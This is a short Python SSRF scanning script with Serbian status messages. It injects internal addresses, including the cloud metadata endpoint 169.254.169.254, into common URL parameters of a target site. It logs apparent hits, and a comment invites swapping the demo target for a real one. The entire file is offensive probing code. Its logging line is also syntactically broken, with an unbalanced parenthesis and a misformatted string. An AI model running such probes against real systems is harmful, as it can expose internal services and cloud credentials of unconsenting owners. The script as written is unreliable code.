import requests
from utils.log_utils import log_to_sheet, classify_severity

SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254",  # AWS metadata
    "http://[::1]",            # IPv6 localhost
]

def test_ssrf(base_url):
    for param in ["url", "uri", "target", "dest", "path"]:
        for payload in SSRF_PAYLOADS:
            try:
                full_url = f"{base_url}?{param}={payload}"
                response = requests.get(full_url, timeout=5)
                if response.status_code == 200 and "localhost" in response.text.lower():
                    print(f"[!] Mogući SSRF: {full_url}")
                    severity = classify_severity(f"SSRF: {full_url}")
                    log_to_sheet(__file__, f"SSRF: {full_url}") + f' | Severity: {{severity}}')
            except Exception as e:
                print(f"[-] Greška za {full_url}: {e}")

def run_ssrf():
    print("[~] Pokrećem SSRF test...")
    targets = [
        "http://testphp.vulnweb.com",  # zameni sa stvarnim
    ]
    for target in targets:
        test_ssrf(target)

if __name__ == "__main__":
    run_ssrf()
